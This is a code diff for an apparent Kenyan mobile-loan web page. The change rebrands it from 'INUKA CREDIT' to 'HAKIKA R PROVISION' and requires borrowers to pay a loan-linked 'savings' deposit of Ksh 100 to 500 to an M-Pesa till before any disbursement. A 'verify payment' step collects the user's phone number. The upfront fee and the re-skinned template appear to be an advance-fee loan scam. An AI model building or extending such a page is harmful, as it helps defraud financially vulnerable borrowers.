@@ -112,7 +112,7 @@
       <h2>ACCOUNT SAVINGS</h2>
       <p>
         Based on your selected loan amount of <strong id="loanAmount">Ksh 0.00</strong>, HAKIKA R PROVISION requires you to save
-        <strong>Ksh 250.00</strong> (Selected Savings Plan) to your Hakika account.
+        <strong id="savingsAmount">Ksh 0.00</strong> (Selected Savings Plan) to your Hakika account.
         This helps strengthen your credit profile. Your savings will be withdrawable exclusively
         upon successful completion of your first loan repayment cycle.
       </p>
@@ -121,26 +121,35 @@
     <div class="change-plan">Change Savings Plan</div>
 
     <div class="payment-box">
-      <p><strong>How to save to your INUKA A/C:</strong></p>
+      <p><strong>How to save to your Hakika A/C:</strong></p>
       <p>Go to M~Pesa: <span class="highlight">M~pesa</span></p>
       <p>Lipa na M~Pesa: <span class="highlight">Buy Goods & Services</span></p>
       <p>Enter Till Number: <span class="highlight" id="tillNumber">9824375</span></p>
 
       <button class="copy-btn" onclick="copyTill()">CLICK TO COPY TILL</button>
 
-      <p>Enter Amount: <span class="highlight">Ksh 250.00</span></p>
+      <p>Enter Amount: <span class="highlight" id="displayAmount">Ksh 0.00</span></p>
       <p>Complete Payment: <span class="highlight">Enter M~Pesa Pin</span></p>
 
       <button class="button" onclick="verifyPayment()">Verify Payment to Initiate Loan Disbursement</button>
     </div>
 
-    <div class="footer">© INUKA CREDIT</div>
+    <div class="footer">© HAKIKA R PROVISION 2025</div>
   </div>
 
   <script>
-    // Load loan info from localStorage
-    const loanAmount = localStorage.getItem("loanAmount") || "0";
-    document.getElementById("loanAmount").textContent = `Ksh ${parseInt(loanAmount).toLocaleString("en-KE")}`;
+    function calculateSavings(loan) {
+      if (loan < 2000) return 100;
+      else if (loan < 5000) return 250;
+      else return 500;
+    }
+
+    const loan = parseInt(localStorage.getItem("loanAmount")) || 0;
+    const savings = calculateSavings(loan);
+
+    document.getElementById("loanAmount").textContent = `Ksh ${loan.toLocaleString()}`;
+    document.getElementById("savingsAmount").textContent = `Ksh ${savings.toLocaleString()}`;
+    document.getElementById("displayAmount").textContent = `Ksh ${savings.toLocaleString()}`;
 
     function copyTill() {
       const till = document.getElementById("tillNumber").textContent;
@@ -150,8 +159,32 @@
     }
 
     function verifyPayment() {
-      alert("Verifying payment... (You can add real API call here)");
-      // You can redirect or show loading animation
+      const phone = prompt("Enter your M-Pesa number for verification:");
+      if (!phone || phone.length < 10) {
+        alert("Invalid phone number");
+        return;
+      }
+
+      fetch("https://your-mpesa-api-endpoint.com/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          phone,
+          amount: savings,
+          till: "9824375"
+        })
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            window.location.href = "success.html";
+          } else {
+            alert("Payment not found. Please try again later.");
+          }
+        })
+        .catch(err => {
+          alert("Error verifying payment. Please try again later.");
+        });
     }
   </script>
 </body>
